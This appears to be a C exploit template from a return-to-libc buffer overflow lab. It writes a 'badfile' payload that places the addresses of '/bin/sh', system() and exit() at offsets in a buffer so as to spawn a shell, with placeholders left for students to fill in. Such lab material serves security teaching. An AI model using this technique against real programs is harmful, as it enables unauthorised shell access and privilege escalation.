#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[40];
    FILE *badfile;

    badfile = fopen("./badfile", "w");

    // You need to obtain the addresses and the values for X, Y, Z
    // in the code below from the lab instruction steps
  
    // 1. Replace X with the value of distance + 12
    // 2. Replace address with the address of "/bin/sh"
    *(long *) &buf[X] = address; 
  
    // 1. Replace Y with the value of distance + 4
    // 2. Replace address with the address of system()
    *(long *) &buf[Y] = address;
  
    // 1. Replace Z with the value of distance + 8
    // 2. Replace address with the address of exit()
    *(long *) &buf[Z] = address;

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
